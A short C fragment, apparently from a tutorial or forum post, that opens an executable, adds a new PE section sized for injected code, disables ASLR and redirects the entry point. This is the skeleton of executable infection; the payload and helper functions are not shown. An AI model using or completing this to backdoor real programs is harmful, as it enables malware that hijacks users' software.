...
{
	FILE *PEFileF;
	PE_Info PEfile, newPEfile;
	IMAGE_SECTION_HEADER sectionHeader;

	PEFileF = fopen("Test.exe", "a+b");
	if (PEFileF == NULL)
	{
	...
	int sizeCode = strlen(codeInject);
	
	init(PEFileF, &PEfile);
	addSection(sizeCode, PEfile, &newPEfile, &sectionHeader);
	disableASLR(&newPEfile);
	changEntryPoint(&newPEfile);
	writeToFile(newPEfile);
